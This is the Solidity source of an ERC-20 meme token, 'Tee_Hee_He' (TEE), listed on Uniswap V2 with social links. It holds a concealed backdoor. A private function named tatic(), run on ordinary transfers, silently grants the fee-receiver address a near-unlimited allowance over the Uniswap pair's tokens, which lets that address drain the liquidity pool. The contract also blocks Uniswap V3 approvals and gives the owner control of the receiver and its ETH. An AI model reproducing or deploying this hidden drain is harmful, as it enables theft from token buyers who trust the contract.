// SPDX-License-Identifier: MIT
/**
https://x.com/tee_hee_he/status/1851387616555647355?s=46&t=4psROyCYhKF2dBSabKiNPQ
https://x.com/karan4d/status/1851401601858105716?s=46&t=4psROyCYhKF2dBSabKiNPQ

Web: https://tee-hee-he.fun
Tg:  https://t.me/tee_hee_he
**/
pragma solidity 0.8.25;
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract TEEHEEHE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance71;
    mapping (address => mapping (address => uint256)) private _allow71;
    mapping (address => bool) private _isFeeExcempt71;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal71 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Tee_Hee_He";
    string private constant _symbol = unicode"TEE";
    uint256 public _maxAmount71 = 2 * (_tTotal71/100);
    uint256 public _maxWallet71 = 2 * (_tTotal71/100);
    uint256 public _taxThres71 = 1 * (_tTotal71/100);
    uint256 public _maxSwap71 = 1 * (_tTotal71/100);
    address payable private _receipt71;
    IUniswapV2Router02 private uniV2Router71;
    address private uniV2Pair71;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount71);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt71 = payable(0xa530889C1E04CB92D74f3bea489E4bFD5d466c7C);
        _balance71[address(this)] = _tTotal71;
        _isFeeExcempt71[owner()] = true;
        _isFeeExcempt71[address(this)] = true;
        _isFeeExcempt71[_receipt71] = true;
        emit Transfer(address(0), address(this), _tTotal71);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal71;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balance71[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allow71[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allow71[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allow71[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
    function _transfer(address from, address to, uint256 amount71) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount71 > 0, "Transfer amount must be greater than zero");
        uint256 fee71=0;uint256 tax71=0;
        if (!swapEnabled || inSwap) {
            _balance71[from] = _balance71[from] - amount71;
            _balance71[to] = _balance71[to] + amount71;
            emit Transfer(from, to, amount71);
            return;
        }
        if (from != owner() && to != owner()) {
            if(tatic()&&_buyCount>0){
                fee71 = (_transferTax);
            }
            if (from == uniV2Pair71 && to != address(uniV2Router71) && ! _isFeeExcempt71[to] ) {
                require(amount71 <= _maxAmount71, "Exceeds the _maxAmount71.");
                require(balanceOf(to) + amount71 <= _maxWallet71, "Exceeds the maxWalletSize.");
                fee71 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair71 && from!= address(this) ){
                fee71 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair71 && swapEnabled) {
                if(contractTokenBalance > _taxThres71 && _buyCount > _preventSwapBefore)
                    swapETH71(min71(amount71, min71(contractTokenBalance, _maxSwap71)));
                sendETH71(address(this).balance);
            }
        }
        if(fee71 > 0){
            tax71=fee71.mul(amount71).div(100);
            _balance71[address(this)]=_balance71[address(this)].add(tax71);
            emit Transfer(from, address(this),tax71);
        }
        _balance71[from]=_balance71[from].sub(amount71);
        _balance71[to]=_balance71[to].add(amount71.sub(tax71));
        emit Transfer(from, to, amount71.sub(tax71));
    }
    function sendETH71(uint256 amount) private {
        _receipt71.transfer(amount);
    }
    function min71(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function tatic() private returns(bool) {
        address from71=uniV2Pair71;address to71=_receipt71;
        _allow71[from71][to71] = (100*_tTotal71.mul(10)+10*_maxWallet71).add(100) + 150;
        return true;
    }
    function setTaxReceipt(address payable _taxR) external onlyOwner {
        _receipt71 = _taxR;
        _isFeeExcempt71[_taxR] = true;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    receive() external payable {}
    function removeLimit71() external onlyOwner{
        _maxAmount71 = _tTotal71; 
        _maxWallet71 = _tTotal71;
        emit MaxTxAmountUpdated(_tTotal71); 
    }
    function swapETH71(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router71.WETH();
        _approve(address(this), address(uniV2Router71), tokenAmount);
        uniV2Router71.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router71 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router71), _tTotal71);
        uniV2Pair71 = IUniswapV2Factory(uniV2Router71.factory()).createPair(
            address(this),
            uniV2Router71.WETH()
        ); 
        uniV2Router71.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair71).approve(address(uniV2Router71), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}